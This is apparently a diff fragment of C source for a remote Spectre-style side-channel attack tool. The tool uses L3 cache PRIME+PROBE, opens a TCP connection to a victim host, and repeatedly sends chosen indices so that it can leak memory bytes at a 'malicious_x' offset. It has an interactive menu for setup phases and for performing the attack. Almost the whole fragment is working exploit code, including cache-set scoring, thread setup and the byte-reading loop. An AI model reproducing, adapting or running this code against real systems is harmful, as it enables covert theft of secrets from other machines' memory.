-				train_x = (attack_state >> 1) & 0x3;
-			}
-
-
-			bzero(scores_tmp,256*sizeof(float));
-			bzero(num_of_comps_tmp,256*sizeof(int));
-			scoring(num_of_comps_tmp,scores_tmp,NULL,NULL,nmonitored,samples);
-
-			for(int tmpi=0;tmpi<nmonitored;tmpi++){
-				scores[monitoredlines[tmpi]/4]+=scores_tmp[tmpi];
-				num_of_comps[monitoredlines[tmpi]/4]+=num_of_comps_tmp[tmpi];
-			}
-
-			l3_unmonitorall(l3);
-
-		}
-
-
-		int j,k,i;
-		j = k = -1;
-		for (i = 0; i < 256; i++) {
-			if (j < 0 || scores[i]/num_of_comps[i] >= scores[j]/num_of_comps[j]) {
-				k = j;
-				j = i;
-			} else if (k < 0 || scores[i]/num_of_comps[i] >= scores[k]/num_of_comps[k]) {
-				k = i;
-			}
-		}
-		printf("array1_size_rawset = %"PRIu32", 1st = %d, score = %f (%d) , 2nd = %d, score = %f (%d)\n",array1_size_rawset, j,scores[j]/num_of_comps[j],num_of_comps[j],k,scores[k]/num_of_comps[k],num_of_comps[k]);
-
-	}
-
-}
-
-void scanRawSetForSpecificX(size_t chosen_x, uint8_t chosen_value, char swap){
-	if(chosen_x >= ARRAY1_SIZE){
-		printf("warning: chosen_x (%lu) > array1_size (%d)\n",chosen_x,ARRAY1_SIZE); fflush(stdout);
-	}
-
-	float scores[NSLICES] = {0};
-	int activity[NSLICES] = {0};
-	int num_of_comps[NSLICES] = {0};
-	int oos[NSLICES] = {0};
-
-	uint32_t rawset = chosen_value * 4 + array2_offset;
-
-
-	for (int i = rawset; i < nsets; i+=nsets/nslices){
-		l3_unmonitorall(l3);
-		l3_monitor(l3,i);
-		set_pp_params(1,samples,interval);
-		uint64_t s,t;
-		while(get_pp_flag()){ //until pp end
-			s = rdtscp64();
-			t = 0;
-			while(t < window){
-				DELAY(500);
-				if (attack_flag){
-					send_to_victim_x(chosen_x);
+			for(int i=0;i<nmonitored;i++){
+				if(potential_sets==256){
+					scores[monitoredlines[i]/4]+=scores_tmp[i];
+					num_of_comps[monitoredlines[i]/4]+=num_of_comps_tmp[i];
 				}else{
-					send_to_victim_x(chosen_x - 1);
+					scores[monitoredlines[i]]+=scores_tmp[i];
+					num_of_comps[monitoredlines[i]]+=num_of_comps_tmp[i];
 				}
-				t = rdtscp64() - s;
 			}
-			attack_flag = !attack_flag;
+
+			l3_unmonitorall(l3);
 		}
 
-		scoring(num_of_comps+SLICE(i),scores+SLICE(i),activity+SLICE(i),oos+SLICE(i),1,samples);
-	}
+		//Find 1st and 2nd highest scores
 
-	//	for(int i = 0; i < nslices; i ++){
-	//		printf("Slice %d: %.2f%% (%.2f%%) %d\n",i,(float)activity[i]/samples * 100,(float)oos[i]/samples * 100,rawset + i*1024);
-	//	}
-
-	for(int i = 0; i < nslices; i ++){
-		printf("Slice %d: %.2f (%d), activity = %d, oos = %d, set %d\n",i,scores[i]/num_of_comps[i],num_of_comps[i],activity[i],oos[i],rawset+i*nsets/nslices);
-	}
-
-	int max_slice = 0;
-	int candidates = 0;
-	for(int i = 0; i < nslices; i++){ //todo auto swap
-		if(scores[i]/num_of_comps[i] > scores[max_slice]/num_of_comps[max_slice])
-			max_slice = i;
-		candidates += scores[i]/num_of_comps[i] > SWAP_SLICES_THRESHOLD;
-	}
-	char doSwap = swap;
-
-	printf("max_slice = %d, candidates = %d\n",max_slice,candidates);
-
-	if (candidates == 1 && max_slice){
-		if (!swap){
-			printf("Swap?\n"); fflush(stdout);
-			doSwap = uint32Input();
+		int j,k,i;
+		j = k = -1;
+		for (i = 0; i < potential_sets; i++) {
+			if (j < 0 || scores[i]/num_of_comps[i] >= scores[j]/num_of_comps[j]) {
+				k = j; j = i;
+			} else if (k < 0 || scores[i]/num_of_comps[i] >= scores[k]/num_of_comps[k]) {
+				k = i;
+			}
 		}
-		if (doSwap){
-			l3_swapslices(l3,0,max_slice);
-			printf("Slices 0,%d swapped.\n",max_slice); fflush(stdout);
+		if(!setup_flag)
+			printf("1st = %d, score = %f (%d) , 2nd = %d, score = %f (%d) , Gap = %f,scouted_sets=%d\n",j,scores[j]/num_of_comps[j],num_of_comps[j],k,scores[k]/num_of_comps[k],num_of_comps[k], (scores[j]/num_of_comps[j]-scores[k]/num_of_comps[k]),scouted_sets);
+		ok = ((scores[j]/num_of_comps[j] > SCORE_THRESHOLD) && ((scores[j]/num_of_comps[j]-scores[k]/num_of_comps[k]) > GAP_THRESHOLD) && num_of_comps[j] > MIN_CMPS);
+		*value = j;
+		if(num_of_comps[j]>MAX_CMPS || scouted_sets==0) break;
+		if(!ok)
+			for (int tmpi = 0; tmpi < potential_sets; tmpi++)
+				if(num_of_comps[tmpi] > 0 && scores[tmpi]/num_of_comps[tmpi]<SCORE_LOWBOUND)
+					suspected_sets[tmpi]=1;
+	}
+	if(setup_flag){
+		printf("Potential sets for array1[x], array2[array1[x]*256]: \n");
+		for(int i=0;i<potential_sets;i++){
+			if(scores[i]/num_of_comps[i]>THRESH_FOR_SETUP){
+				printf("set %d, score: %.2f (%d comps)\n",i, scores[i]/num_of_comps[i],num_of_comps[i]);
+			}
 		}
 	}
+	free(scores);
+	free(scores_tmp);
+	free(num_of_comps);
+	free(num_of_comps_tmp);
+	return ok;
 
-	l3_unmonitorall(l3);
 }
 
 
-int main(int argc, const char **argv)
-{
 
-	delayloop(3000000000U);
-	l3 = l3_prepare(NULL);
-	nsets = l3_getSets(l3);
-	nslices = l3_getSlices(l3);
-	monitoredlines = calloc(nsets,sizeof(int));
-	printf("Sets : %d, Slices : %d\n",nsets,nslices); fflush(stdout);
-
-	for (int i = 0; i < nsets; i ++)
-		l3_monitor(l3,i);
-	l3_unmonitorall(l3);
-
-	//	//Create socket
-	guard(sock = socket(AF_INET , SOCK_STREAM , 0),"Could not create socket");
-	//	guard(sock = socket(AF_INET , SOCK_STREAM , IPPROTO_UDP),"Could not create socket");
-	puts("Socket created");
-	server.sin_addr.s_addr = inet_addr(VICTIM_IP);
-	server.sin_family = AF_INET;
-	server.sin_port = htons( VICTIM_PORT );
-	guard(connect(sock , (struct sockaddr *)&server , sizeof(server)),"Could not connect");
-	puts("Connected\n");
-
+void thread_setup(pthread_t * pp_thread){
 	uint64_t s,t;
-
-	//	START TMP
-	//	if(argc < 3)
-	//		return EXIT_FAILURE;
-	//	size_t tmp_x = strtoul(argv[1],NULL,10);
-	//	uint64_t tmp_window = strtoul(argv[2],NULL,10);
-	//	printf("tmp_x = %lu, tmp_window = %lu\n",tmp_x,tmp_window); fflush(stdout);
-	//	while(1){ //until pp end
-	//		s = rdtscp64();
-	//		t = 0;
-	//		while(t < tmp_window){
-	//
-	//			delayloop(tmp_window/10);
-	//
-	//			memaccess(&tmp_x);
-	//			if (attack_flag){
-	//				send_to_victim_x(tmp_x);
-	//			}else{
-	//				send_to_victim_x(tmp_x+1);
-	//			}
-	//			t = rdtscp64() - s;
-	//		}
-	//		attack_flag = !attack_flag;
-	//	}
-
-	//	END TMP
-
-	pthread_t pp_thread;
-
 	int count;
 	char oos_err;
 	char thread_setup_done = 0;
-	while(!thread_setup_done){
-
-		if (pthread_create(&pp_thread, NULL, &primeProbe, (void*)NULL)) {
+	while(!thread_setup_done){ //repeat until the threads do not context switch between them
+		if (pthread_create(pp_thread, NULL, &receive_signal, (void*)NULL)) {
 			printf("pthread_create failed\n"); fflush(stdout);
-			return EXIT_FAILURE;
+			exit(EXIT_FAILURE);
 		}
 
-		for (int i = 0; i < SETUP_SCHED_CHECKS; i++){
-			set_pp_params(1,samples,interval);
+		set_pp_params(1,samples,interval);
 
-			//send x until pp end
-			s = rdtscp64();
-			t = 0;
-			count = 0;
-			while(get_pp_flag()){
-				send_to_victim_x(0);
-				count++;
-			}
-			printf("# sent %d tcp's\n",count); fflush(stdout);
-
-			oos_err = get_pp_oos_err();
-
-			if (oos_err){ //set thread to finish and wait
-				set_pp_params(0,0,0);
-				while(get_pp_flag());
-				break;
-			}
-
+		//send x until pp end
+		s = rdtscp64();
+		t = 0;
+		count = 0;
+		while(get_pp_flag()){
+			send_to_victim_x(0);
+			count++;
 		}
+		oos_err = get_pp_oos_err();
+
+		if (oos_err){ //set thread to finish and wait
+			set_pp_params(0,0,0);
+			while(get_pp_flag());
+			break;
+		}
+
+
 		if (!oos_err){
 			printf("# thread setup done!\n"); fflush(stdout);
 			thread_setup_done = 1;
 		} else {
 			printf("# thread setup failed, trying again...\n"); fflush(stdout);
-			if (pthread_join(pp_thread, NULL)) {
+			if (pthread_join(*pp_thread, NULL)) {
 				printf("# pthread_join failed\n"); fflush(stdout);
 				exit(EXIT_FAILURE);
 			} else {
 				printf("# pthread_join success\n");
 			}
 		}
-		DELAY(2000);
 	}
+}
 
 
-	array2_offset = 0;
-	array1_size_rawset = 0;
-	secret_length = 1;
-	array2_slice = 0;
+int main(int argc, const char **argv)
+{
+	printf("format ./prog <malicious_x> <array1_size_set> <attack_length>\n");
+	delayloop(3000000000U);
+	l3 = l3_prepare(NULL);
+	nsets = l3_getSets(l3);
+	nslices = l3_getSlices(l3);
+	monitoredlines = calloc(nsets,sizeof(int));
+	suspected_sets = calloc(nsets,sizeof(unsigned char));
+	printf("Sets : %d, Slices : %d\n",nsets,nslices); fflush(stdout);
+
+	for (int i = 0; i < nsets; i ++)
+		l3_monitor(l3,i);
+	l3_unmonitorall(l3);
+
+	//Create socket
+	guard(target_sock = socket(AF_INET , SOCK_STREAM , 0),"Could not create socket");
+	puts("Socket created");
+	server_struct.sin_addr.s_addr = inet_addr(VICTIM_IP);
+	server_struct.sin_family = AF_INET;
+	server_struct.sin_port = htons( VICTIM_PORT );
+	guard(connect(target_sock , (struct sockaddr *)&server_struct , sizeof(server_struct)),"Could not connect");
+	puts("Connected");
+
+
+	pthread_t pp_thread;
+	thread_setup(&pp_thread);
+
+	array1_size_set = 0;
+	attack_length = 1;
 	if (argc > 1)
 		malicious_x = strtoul(argv[1],NULL,10);
 	if (argc > 2)
-		array2_offset = atoi(argv[2]);
+		array1_size_set = atoi(argv[2]);
 	if (argc > 3)
-		array1_size_rawset = atoi(argv[3]);
-	if (argc > 4)
-		secret_length = atoi(argv[4]);
+		attack_length = atoi(argv[3]);
 
 	delayloop(300000U);
-	scanRawSetForSpecificX(8,9,1);
-
 
 	int option = -1;
-	uint32_t s1,s2;
-	uint64_t chosen_x; uint8_t chosen_value;
 	uint64_t tmp64;
 	uint32_t tmp32;
-	printf("right format ./prog <malicious_x> <array2_offset> <array1_size_rawset> <secret_length>\n");
+
 	while(option != 99){
 		printf("--------------------------------------------\n");
-		printf("malicious_x = %lu, array2_offset = %u, array1_size_rawset = %u, secret_length = %u\n",malicious_x,array2_offset,array1_size_rawset,secret_length);
-		printf("interval = %lu, samples = %lu, window = %lu, tomonitor = %u,save2file = %u\n",interval,samples,window,tomonitor,save2file);
+		printf("malicious_x = %lu, array1_size_set = %u, attack_length = %u\n",malicious_x,array1_size_set,attack_length);
+		printf("interval = %lu, samples = %lu, window = %lu, tomonitor = %u\n",interval,samples,window,tomonitor);
 
 		printf("1) Set malicious_x\n");
-		printf("2) Set array2_offset\n");
-		printf("3) Set array1_size_rawset\n");
-		printf("4) Set secret_length\n");
+		printf("3) Set array1_size_set\n");
+		printf("4) Set attack_length\n");
 		printf("5) Set interval \t(PRIME+PROBE sample slot) \t[cpu ticks]\n");
 		printf("6) Set samples \t\t(PRIME+PROBE samples) \t\t[cpu ticks]\n");
 		printf("7) Set window \t\t(activity ON/OFF window) \t[cpu ticks]\n");
 		printf("8) Set tomonitor \t(how much sets to monitor in parallel each scan)\n");
-		printf("9) Set array2_slice\n");
-		printf("10) Swap slices\n");
-		printf("11) Check activity on rawset by chosen secret\n");
-		printf("12) Perform attack\n");
-		printf("13) Set save2file (attack results will be saved under results)\n");
-		printf("14) set up - find array1 set\n");
-		printf("15) set up - find array1_size set\n");
+		printf("9) Setup - part 1\t(Array1_size value, Array1, Array2)\n");
+		printf("10) Setup - part 2\t(Array1_size set)\n");
+		printf("11) Perform attack\n");
 		printf("99) Exit\n");
-		printf("debug menu: nmonitored = %d\n",l3_getmonitoredset(l3,NULL,0));
-		printf("101) Monitor set\n");
-		printf("102) Unmonitor set\n");
-		printf("103) Unmonitor all\n");
-		printf("104) Print monitored sets\n");
-		printf("105) Prime & Probe monitored sets\n");
 
 		fflush(stdout);
 		option = uint32Input();
@@ -1025,20 +527,15 @@ int main(int argc, const char **argv)
 			fflush(stdout);
 			malicious_x = uint64Input();
 			break;
-		case 2:
-			printf("Enter array2_offset: \n");
-			fflush(stdout);
-			array2_offset = uint32Input();
-			break;
 		case 3:
-			printf("Enter array1_size_rawset: \n");
+			printf("Enter array1_size_set: \n");
 			fflush(stdout);
-			array1_size_rawset = uint32Input();
+			array1_size_set = uint32Input();
 			break;
 		case 4:
-			printf("Enter secret_length: \n");
+			printf("Enter attack_length: \n");
 			fflush(stdout);
-			secret_length = uint32Input();
+			attack_length = uint32Input();
 			break;
 		case 5:
 			printf("Enter interval: \n");
@@ -1064,176 +561,60 @@ int main(int argc, const char **argv)
 			tomonitor = uint32Input();
 			break;
 		case 9:
-			printf("Enter array2_slice: \n");
-			fflush(stdout);
-			array2_slice = uint32Input();
-			break;
-		case 10:
-			s1 = 0;
-			s2 = 0;
-			printf("Swap Slices!\n");
-			printf("Select slice A num (0-%d): ",nslices-1); fflush(stdout);
-			s1 = uint32Input();
-			if (s1 < 0 || s1 >= nslices) {
-				printf("invalid slice number!\n");
-				break;
-			}
-
-			printf("Select slice B num (0-%d): ",nslices-1); fflush(stdout);
-
-			s2 = uint32Input();
-
-			if (s2 < 0 || s2 >= nslices) {
-				printf("invalid slice number!\n"); fflush(stdout);
-				break;
-			}
-
-			l3_swapslices(l3,s1,s2);
-			break;
-		case 11:
-			printf("Enter chosen x:\n"); fflush(stdout);
-			chosen_x = uint64Input();
-			printf("Enter expected value:\n"); fflush(stdout);
-			chosen_value = uint32Input();
-			scanRawSetForSpecificX(chosen_x,chosen_value,0);
-			break;
-		case 12:
-			printf("Reading %d bytes:\n", secret_length);
+			printf("train_x = -1, please enter potentially valid x:\n");
 			{
 				struct timeb start, end;
-				int diff,nsucc = 0;
-				int res;
-				uint64_t total_time = 0;
-				unsigned char value;
-				for (int i = 0; i < secret_length; i++){
+				int diff = 0;
+				unsigned char value, setup_flag=1;
+				size_t x = uint64Input();
+				bzero(suspected_sets,nsets*sizeof(unsigned char));
+				ftime(&start);
+				attack_routine(x ,&value,nsets,setup_flag);
+				ftime(&end);
+				diff = (int) (1000.0 * (end.time - start.time) + (end.millitm - start.millitm));
+				printf("Operation took %u milliseconds\n", diff);
+			}
+			break;
+		case 10:
+			printf("Searching for Array1_size at malicious_x=%lu\n",malicious_x);
+			{
+				struct timeb start, end;
+				int diff = 0;
+				unsigned char value, setup_flag=2;
+				ftime(&start);
+				for(int i=0;i<nsets;i++){
+					printf("Array1_size set=%d\n",i);
+					array1_size_set=i;
+					bzero(suspected_sets,nsets*sizeof(unsigned char));
+					attack_routine(malicious_x,&value,nsets,setup_flag);
+				}
+				ftime(&end);
+				diff = (int) (1000.0 * (end.time - start.time) + (end.millitm - start.millitm));
+				printf("Operation took %u milliseconds\n", diff);
+
+			}
+			break;
+		case 11:
+			printf("Reading %d bytes:\n", attack_length);
+			{
+				struct timeb start, end;
+				int diff = 0;
+				unsigned char value, setup_flag=0;
+				for (int i = 0; i < attack_length; i++){
 					bzero(suspected_sets,256*sizeof(unsigned char));
-					//					for (int tmpi = 0; tmpi<256;tmpi++){
-					//						if(tmpi!=205)
-					//							suspected_sets[tmpi]=1;
-					//					}
 					printf("Reading at malicious_x = %lu\n", malicious_x + i); fflush(stdout);
 					ftime(&start);
-					res = readMemoryByte(malicious_x + i,&value);
+					attack_routine(malicious_x + i,&value,256,setup_flag);
 					ftime(&end);
 					diff = (int) (1000.0 * (end.time - start.time) + (end.millitm - start.millitm));
 					printf("Operation took %u milliseconds\n", diff);
-					total_time+=diff;
-					if(value==actual_secret[i%256]){
-						nsucc++;
-						printf("Right!\n");
-					} else{
-						printf("Wrong (%d)!\n",actual_secret[i%256]);
-					}
-					printf("Psuc = (%d / %d) \t Average time = (%lu / %d) ms\n\n", nsucc, i+1,total_time, i+1);
 				}
-
-				printf("Psuc = (%d / %d) \t Average time = (%lu / %d) ms\n", nsucc, secret_length,total_time, (secret_length));
 			}
 			break;
-		case 13:
-			printf("Enter save2file: \n"); fflush(stdout);
-			save2file = uint32Input();
-			break;
-		case 14:
-		{
-			struct timeb start, end;
-			int diff = 0;
-			int res;
-			unsigned char value;
-			size_t train_x = -1;
-			printf("Test x: \n"); fflush(stdout);
-			size_t x = uint64Input();
-			bzero(suspected_sets,NSETS_SETUP*sizeof(unsigned char));
-			ftime(&start);
-			res = set_up_array1_readMemoryByte(x,train_x,&value);
-			ftime(&end);
-			diff = (int) (1000.0 * (end.time - start.time) + (end.millitm - start.millitm));
-			printf("Operation took %u milliseconds\n", diff);
-		}
-		break;
-		case 16:
-		{
-			struct timeb start, end;
-			int diff = 0;
-			int res;
-			uint64_t total_time = 0;
-			unsigned char value;
-			bzero(suspected_sets,256*sizeof(unsigned char));
-			printf("Reading at malicious_x = %lu\n", malicious_x); fflush(stdout);
-			ftime(&start);
-			res = set_up_array1_size_readMemoryByte(malicious_x,&value);
-			ftime(&end);
-			diff = (int) (1000.0 * (end.time - start.time) + (end.millitm - start.millitm));
-			printf("Operation took %u milliseconds\n", diff);
-			total_time+=diff;
-		}
-		break;
+
+
 		case 99:
-			printf("Bye Bye... \n");
-			break;
-		case 101:
-			printf("Enter set to monitor: \n"); fflush(stdout);
-			tmp32 = uint32Input();
-			l3_monitor(l3,tmp32);
-			break;
-		case 102:
-			printf("Enter set number to unmonitor: \n"); fflush(stdout);
-			tmp32 = uint32Input();
-			l3_unmonitor(l3,tmp32);
-			break;
-		case 103:
-			l3_unmonitorall(l3);
-			break;
-		case 104:
-			tmp32 = l3_getmonitoredset(l3,monitoredlines,nsets);
-			for (int i = 0; i < tmp32; i++){
-				printf("%d) %d\n",i,monitoredlines[i]);
-			}
-			break;
-		case 105:
-			nmonitored = l3_getmonitoredset(l3,monitoredlines,nsets);
-			set_pp_params(1,samples,interval);
-			while(get_pp_flag()); //until pp end
-			{
-				FILE *f_monitor_res;
-				FILE *f_monitor_res_times;
-				char str[64];
-				struct stat st = {0};
-				if (stat("debug_results", &st) == -1) {
-					mkdir("debug_results", 0700);
-				}
-				for (int offset = 0; offset < nmonitored; offset++){
-					int actual_set = monitoredlines[offset];
-					uint16_t * monitor_res_divided = calloc(samples,sizeof(uint16_t));
-					uint64_t * monitor_res_times_divided = calloc(samples,sizeof(uint64_t));
-					int count_activity = 0;
-					int count_oos = 0;
-					for (int i = 0; i < samples; i++){
-						monitor_res_divided[i] = monitor_res[offset + nmonitored*i];
-						monitor_res_times_divided[i] = monitor_res_times[offset + nmonitored*i];
-						if (monitor_res_divided[i] == (uint16_t)-1)
-							count_oos++;
-						else if(monitor_res_divided[i] > 0)
-							count_activity++;
-					}
-					printf("set %d: %.2f%% (%.2f%%)\n",actual_set,(float)count_activity/samples * 100,(float)count_oos/samples * 100);
-
-					sprintf(str,"debug_results/monitor_res_%d",actual_set);
-					f_monitor_res = fopen(str, "w+");
-
-					sprintf(str,"debug_results/monitor_res_times_%d",actual_set);
-					f_monitor_res_times = fopen(str, "w+");
-
-					fwrite(monitor_res_divided, sizeof(uint16_t), samples, f_monitor_res);
-					fwrite(monitor_res_times_divided, sizeof(uint64_t), samples, f_monitor_res_times);
-
-					fclose(f_monitor_res);
-					fclose(f_monitor_res_times);
-
-					free(monitor_res_divided);
-					free(monitor_res_times_divided);
-				}
-			}
+			printf("Exit... \n");
 			break;
 		}
 
@@ -1241,7 +622,8 @@ int main(int argc, const char **argv)
 	}
 
 	free(monitoredlines);
-	close(sock);
+	free(suspected_sets);
+	close(target_sock);
 	l3_release(l3);
 
 	return EXIT_SUCCESS;
